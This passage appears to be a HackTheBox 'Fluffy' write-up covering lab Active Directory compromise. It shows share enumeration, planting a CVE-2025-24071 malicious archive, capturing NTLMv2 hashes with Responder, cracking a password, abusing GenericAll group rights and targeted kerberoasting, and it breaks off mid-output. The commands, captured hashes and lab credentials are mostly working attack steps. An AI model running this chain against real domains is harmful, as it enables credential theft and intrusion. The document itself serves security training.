r={toc:t,anchors:l,links:d,scrollOffset:n,collapseInactive:c};window.addEventListener("scroll",()=>e(r),{passive:!0}),window.addEventListener("hashchange",()=>e(r),{passive:!0}),e(r)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",t):t()})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><h2 class="relative group">Overview<div id=overview class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#overview aria-label=Anchor>#</a></span></h2><ul><li><strong>Platform</strong>: HackTheBox</li><li><strong>Difficulty</strong>: Easy</li><li><strong>OS</strong>: Windows</li><li><strong>Skills</strong>: Active Directory, privilege escalation</li></ul><p><em><strong>Assumed Breach Credentials: j.fleischman / J0elTHEM4n1990!</strong></em></p><h2 class="relative group">Reconnaissance<div id=reconnaissance class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#reconnaissance aria-label=Anchor>#</a></span></h2><h3 class="relative group">Nmap Scan<div id=nmap-scan class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#nmap-scan aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sC -sV -p- -T4 10.10.11.69 -vv
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>53/tcp    open  domain        syn-ack ttl <span class=m>127</span> Simple DNS Plus
</span></span><span class=line><span class=cl>88/tcp    open  kerberos-sec  syn-ack ttl <span class=m>127</span> Microsoft Windows Kerberos <span class=o>(</span>server time: 2025-09-17 03:10:47Z<span class=o>)</span>
</span></span><span class=line><span class=cl>139/tcp   open  netbios-ssn   syn-ack ttl <span class=m>127</span> Microsoft Windows netbios-ssn
</span></span><span class=line><span class=cl>389/tcp   open  ldap          syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2025-09-17T03:12:16+00:00<span class=p>;</span> +7h01m00s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.fluffy.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>fluffy-DC01-CA/domainComponent<span class=o>=</span>fluffy
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds? syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>464/tcp   open  kpasswd5?     syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    syn-ack ttl <span class=m>127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open  ssl/ldap      syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2025-09-17T03:12:16+00:00<span class=p>;</span> +7h01m00s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.fluffy.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>fluffy-DC01-CA/domainComponent<span class=o>=</span>fluffy
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key type: rsa
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key bits: <span class=m>2048</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>3268/tcp  open  ldap          syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2025-09-17T03:12:16+00:00<span class=p>;</span> +7h01m00s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.fluffy.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>fluffy-DC01-CA/domainComponent<span class=o>=</span>fluffy
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>3269/tcp  open  ssl/ldap      syn-ack ttl <span class=m>127</span> Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: fluffy.htb0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2025-09-17T03:12:16+00:00<span class=p>;</span> +7h01m00s from scanner time.
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.fluffy.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>fluffy-DC01-CA/domainComponent<span class=o>=</span>fluffy
</span></span><span class=line><span class=cl><span class=p>|</span>
</span></span><span class=line><span class=cl>5985/tcp  open  http          syn-ack ttl <span class=m>127</span> Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Not Found
</span></span><span class=line><span class=cl>9389/tcp  open  mc-nmf        syn-ack ttl <span class=m>127</span> .NET Message Framing
</span></span><span class=line><span class=cl>49667/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49689/tcp open  ncacn_http    syn-ack ttl <span class=m>127</span> Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>49690/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49693/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49710/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>49716/tcp open  msrpc         syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>Service Info: Host: DC01<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   3:1:1: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> p2p-conficker: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Checking <span class=k>for</span> Conficker.C or higher...
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>1</span> <span class=o>(</span>port 53865/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>2</span> <span class=o>(</span>port 48474/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>3</span> <span class=o>(</span>port 5751/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>4</span> <span class=o>(</span>port 48360/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2025-09-17T03:11:36
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 7h00m59s, deviation: 0s, median: 7h00m59s
</span></span></code></pre></div><p>Add <code>fluffy.htb</code> and <code>dc01.fluffy.htb</code> to <code>/etc/hosts</code></p><p>We use <code>Crackmapexec</code> to enumerate shares, and users on the domain.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>crackmapexec smfluffy.htb -u <span class=s1>&#39;j.fleischman&#39;</span> -p <span class=s1>&#39;J0elTHEM4n1990!&#39;</span> --shares
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SMB         fluffy.htb      <span class=m>445</span>    DC01             IPC$            READ            Remote IPC                                                          
</span></span><span class=line><span class=cl>SMB         fluffy.htb      <span class=m>445</span>    DC01             IT              READ,WRITE                                                                          
</span></span><span class=line><span class=cl>SMB         fluffy.htb      <span class=m>445</span>    DC01             NETLOGON        READ            Logon server share                                                  
</span></span><span class=line><span class=cl>SMB         fluffy.htb      <span class=m>445</span>    DC01             SYSVOL          READ            Logon server share
</span></span></code></pre></div><p>We see an interesting share with <strong>READ</strong> and <strong>WRITE</strong> permissions, but its best to look in all the shares to see if we find anything else interesting.</p><p>Lets use <code>Netexec</code>&rsquo;s spider_plus module to spider the shares and pull all the files in them.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>netexec smb fluffy.htb -u <span class=s1>&#39;j.fleischman&#39;</span> -p <span class=s1>&#39;J0elTHEM4n1990!&#39;</span> -M spider_plus
</span></span></code></pre></div><p>You&rsquo;ll notice we find a pdf document with the name <code>Upgrade_Notice.pdf</code></p><p>Lets check that out..</p><p><figure><img class="my-0 rounded-md" loading=lazy alt=Upgrade_Notice.pdf src=/img/writeups/htb-fluffy/CVEPDF.png></figure></p><p>Just a couple of recent CVE&rsquo;s. But only one really sticks out to us.</p><p>Considering we have write permissions in the <strong>IT</strong> share, we can try <a href=https://github.com/0x6rss/CVE-2025-24071_PoC target=_blank>CVE-2025-24071</a> - NTLM Hash Leak via malicious RAR/ZIP and .library-ms file.</p><h2 class="relative group">CVE-2025-24071<div id=cve-2025-24071 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#cve-2025-24071 aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>root@kali<span class=o>]</span> /home/kali/Fluffy/CVE-2025-24071_PoC <span class=o>(</span>main<span class=o>)</span> 
</span></span><span class=line><span class=cl>❯ python poc.py                                               
</span></span><span class=line><span class=cl>Enter your file name: documents
</span></span><span class=line><span class=cl>Enter IP <span class=o>(</span>EX: 192.168.1.162<span class=o>)</span>: 10.10.16.75
</span></span><span class=line><span class=cl>completed
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>root@kali<span class=o>]</span> /home/kali/Fluffy/CVE-2025-24071_PoC <span class=o>(</span>main<span class=o>)</span> ⚡ 
</span></span><span class=line><span class=cl>❯ smbclient  //10.10.11.69/IT -U j.fleischman
</span></span><span class=line><span class=cl>Password <span class=k>for</span> <span class=o>[</span>WORKGROUP<span class=se>\j</span>.fleischman<span class=o>]</span>:
</span></span><span class=line><span class=cl>Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> ls
</span></span><span class=line><span class=cl>  .                                   D        <span class=m>0</span>  Thu May <span class=m>29</span> 10:19:20 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  ..                                  D        <span class=m>0</span>  Thu May <span class=m>29</span> 10:19:20 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  docs.library-ms                     A      <span class=m>528</span>  Thu May <span class=m>29</span> 10:16:50 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  Everything-1.4.1.1026.x64           D        <span class=m>0</span>  Fri Apr <span class=m>18</span> 11:08:44 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  Everything-1.4.1.1026.x64.zip       A  <span class=m>1827464</span>  Fri Apr <span class=m>18</span> 11:04:05 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  KeePass-2.58                        D        <span class=m>0</span>  Fri Apr <span class=m>18</span> 11:08:38 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  KeePass-2.58.zip                    A  <span class=m>3225346</span>  Fri Apr <span class=m>18</span> 11:03:17 <span class=m>2025</span>
</span></span><span class=line><span class=cl>  Upgrade_Notice.pdf                  A   <span class=m>169963</span>  Sat May <span class=m>17</span> 10:31:07 <span class=m>2025</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=m>5842943</span> blocks of size 4096. <span class=m>1315680</span> blocks available
</span></span><span class=line><span class=cl>smb: <span class=se>\&gt;</span> put exploit.zip 
</span></span><span class=line><span class=cl>putting file exploit.zip as <span class=se>\e</span>xploit.zip <span class=o>(</span>0.9 kb/s<span class=o>)</span> <span class=o>(</span>average 0.9 kb/s<span class=o>)</span>
</span></span></code></pre></div><p>Now we need to start <code>Responder</code> which will host a smb server and listen for a connection back</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>root@kali<span class=o>]</span> /home/kali  
</span></span><span class=line><span class=cl>❯ responder -I tun0 -wvF
</span></span><span class=line><span class=cl>                                         __
</span></span><span class=line><span class=cl>  .----.-----.-----.-----.-----.-----.--<span class=p>|</span>  <span class=p>|</span>.-----.----.
</span></span><span class=line><span class=cl>  <span class=p>|</span>   _<span class=p>|</span>  -__<span class=p>|</span>__ --<span class=p>|</span>  _  <span class=p>|</span>  _  <span class=p>|</span>     <span class=p>|</span>  _  <span class=o>||</span>  -__<span class=p>|</span>   _<span class=p>|</span>
</span></span><span class=line><span class=cl>  <span class=p>|</span>__<span class=p>|</span> <span class=p>|</span>_____<span class=p>|</span>_____<span class=p>|</span>   __<span class=p>|</span>_____<span class=p>|</span>__<span class=p>|</span>__<span class=p>|</span>_____<span class=o>||</span>_____<span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>                   <span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>           NBT-NS, LLMNR <span class=p>&amp;</span> MDNS Responder 3.1.5.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  To support this project:
</span></span><span class=line><span class=cl>  Github -&gt; https://github.com/sponsors/lgandx
</span></span><span class=line><span class=cl>  Paypal  -&gt; https://paypal.me/PythonResponder
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Author: Laurent Gaffie <span class=o>(</span>laurent.gaffie@gmail.com<span class=o>)</span>
</span></span><span class=line><span class=cl>  To <span class=nb>kill</span> this script hit CTRL-C
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Poisoners:
</span></span><span class=line><span class=cl>    LLMNR                      <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    NBT-NS                     <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    MDNS                       <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    DNS                        <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    DHCP                       <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Servers:
</span></span><span class=line><span class=cl>    HTTP server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    HTTPS server               <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    WPAD proxy                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    Auth proxy                 <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    SMB server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    Kerberos server            <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    SQL server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    FTP server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    IMAP server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    POP3 server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    SMTP server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    DNS server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    LDAP server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    MQTT server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    RDP server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    DCE-RPC server             <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    WinRM server               <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    SNMP server                <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> HTTP Options:
</span></span><span class=line><span class=cl>    Always serving EXE         <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Serving EXE                <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Serving HTML               <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Upstream Proxy             <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Poisoning Options:
</span></span><span class=line><span class=cl>    Analyze Mode               <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Force WPAD auth            <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    Force Basic Auth           <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Force LM downgrade         <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Force ESS downgrade        <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Generic Options:
</span></span><span class=line><span class=cl>    Responder NIC              <span class=o>[</span>tun0<span class=o>]</span>
</span></span><span class=line><span class=cl>    Responder IP               <span class=o>[</span>10.10.16.75<span class=o>]</span>
</span></span><span class=line><span class=cl>    Responder IPv6             <span class=o>[</span>dead:beef:4::1049<span class=o>]</span>
</span></span><span class=line><span class=cl>    Challenge <span class=nb>set</span>              <span class=o>[</span>random<span class=o>]</span>
</span></span><span class=line><span class=cl>    Don<span class=s1>&#39;t Respond To Names     [&#39;</span>ISATAP<span class=s1>&#39;, &#39;</span>ISATAP.LOCAL<span class=s1>&#39;]
</span></span></span><span class=line><span class=cl><span class=s1>    Don&#39;</span>t Respond To MDNS TLD  <span class=o>[</span><span class=s1>&#39;_DOSVC&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>    TTL <span class=k>for</span> poisoned response  <span class=o>[</span>default<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Current Session Variables:
</span></span><span class=line><span class=cl>    Responder Machine Name     <span class=o>[</span>WIN-DU8IDYUEGAF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Responder Domain Name      <span class=o>[</span>3CGF.LOCAL<span class=o>]</span>
</span></span><span class=line><span class=cl>    Responder DCE-RPC Port     <span class=o>[</span>48866<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Listening <span class=k>for</span> events...                                                                                                                     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Client   : 10.10.11.69
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Username : FLUFFY<span class=se>\p</span>.agila
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Hash     : p.agila::FLUFFY:94a991ee1dadb617:7CC7520C05900F433F9FAB0C71959703:0101000000000000809AE9316CD0DB012ECCE7CE4B886DE00000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000                                                                                                                                              
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Client   : 10.10.11.69
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Username : FLUFFY<span class=se>\p</span>.agila
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Hash     : p.agila::FLUFFY:6109f53b6d82f7d7:AF4211657658A3B8F79DFDAC295C9728:0101000000000000809AE9316CD0DB01398EE1FFCFE429340000000002000800330043004700460001001E00570049004E002D004400550038004900440059005500450047004100460004003400570049004E002D00440055003800490044005900550045004700410046002E0033004300470046002E004C004F00430041004C000300140033004300470046002E004C004F00430041004C000500140033004300470046002E004C004F00430041004C0007000800809AE9316CD0DB0106000400020000000800300030000000000000000100000000200000313F0E1DD62774CA1E8F9DDBBB7990F703EA1C141D16C2B7DDFFE296E0CF07720A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00370035000000000000000000
</span></span></code></pre></div><p>We will use <code>John</code> here to crack the hash we got</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>root@kali<span class=o>]</span> /home/kali/Fluffy  
</span></span><span class=line><span class=cl>❯ john hash.txt --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>netntlmv2, NTLMv2 C/R <span class=o>[</span>MD4 HMAC-MD5 32/64<span class=o>])</span>
</span></span><span class=line><span class=cl>Will run <span class=m>8</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>prometheusx-303 <span class=o>(</span>p.agila<span class=o>)</span>     
</span></span></code></pre></div><p>PASSWORD: <strong>prometheusx-303</strong></p><p>Cool, now we can further enumerate the domain through our new found credentials.
Its always good to re-run bloodhound once you pwn new users, as higher privileged users can map more of the domain than low privileged in some cases.</p><p>Note that the <code>Faketime</code> command i use before most of my commands later on is to sync our clock time with the domain controller&mldr;</p><p>You can check the DC&rsquo;s time by doing the following:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ntpdate -q dc01.fluffy.htb
</span></span></code></pre></div><h2 class="relative group">Bloodhound<div id=bloodhound class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#bloodhound aria-label=Anchor>#</a></span></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime <span class=s1>&#39;2025-09-17 03:30:34&#39;</span> bloodhound-ce-python -u <span class=s1>&#39;p.agila&#39;</span> -p <span class=s1>&#39;prometheusx-303&#39;</span> -d fluffy.htb -ns 10.10.11.69 -c All --zip
</span></span><span class=line><span class=cl>INFO: BloodHound.py <span class=k>for</span> BloodHound Community Edition
</span></span><span class=line><span class=cl>INFO: Found AD domain: fluffy.htb
</span></span><span class=line><span class=cl>INFO: Getting TGT <span class=k>for</span> user
</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc01.fluffy.htb
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains in the forest
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> computers
</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc01.fluffy.htb
</span></span><span class=line><span class=cl>INFO: Found <span class=m>10</span> users
</span></span><span class=line><span class=cl>INFO: Found <span class=m>54</span> groups
</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> gpos
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> ous
</span></span><span class=line><span class=cl>INFO: Found <span class=m>19</span> containers
</span></span><span class=line><span class=cl>INFO: Found <span class=m>0</span> trusts
</span></span><span class=line><span class=cl>INFO: Starting computer enumeration with <span class=m>10</span> workers
</span></span><span class=line><span class=cl>INFO: Querying computer: DC01.fluffy.htb
</span></span><span class=line><span class=cl>INFO: Done in 00M 04S
</span></span><span class=line><span class=cl>INFO: Compressing output into 20250917033035_bloodhound.zip
</span></span></code></pre></div><p><figure><img class="my-0 rounded-md" loading=lazy alt=bloodhound-agila1 src=/img/writeups/htb-fluffy/bloodhound-agila1.png></figure><figure><img class="my-0 rounded-md" loading=lazy alt=bloodhound-agila2 src=/img/writeups/htb-fluffy/bloodhound-agila2.png></figure></p><p>Here we can see our owned user, <strong>p.agila</strong>.</p><p>Bloodhound tells us 2 things to note:</p><ul><li>our user is part of a group called <strong>SERVICE ACCOUNT MANAGERS</strong> that has <em>GenericAll</em> over the <strong>SERVICE ACCOUNTS</strong> group.</li><li>the <strong>SERVICE ACCOUNTS</strong> group contains 3 users, all service accounts.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD --host <span class=s1>&#39;10.10.11.69&#39;</span> -d <span class=s1>&#39;dc01.fluffy.htb&#39;</span> -u <span class=s1>&#39;p.agila&#39;</span> -p <span class=s1>&#39;prometheusx-303&#39;</span>  add groupMember <span class=s1>&#39;SERVICE ACCOUNTS&#39;</span> p.agila
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> p.agila added to SERVICE ACCOUNTS
</span></span></code></pre></div><p>Lets try a targeted kerberoast attack and see if we can pull any krb5tgs hashes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>faketime <span class=s1>&#39;2025-09-17 16:50:01&#39;</span> python3 /home/kali/htb/voleur/targetedKerberoast/targetedKerberoast.py --dc-ip 10.10.11.69 -d fluffy.htb -u p.agila -p <span class=s1>&#39;prometheusx-303&#39;</span>       
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Starting kerberoast attacks
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Fetching usernames from Active Directory with LDAP
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Printing <span class=nb>hash</span> <span class=k>for</span> <span class=o>(</span>ca_svc<span class=o>)</span>
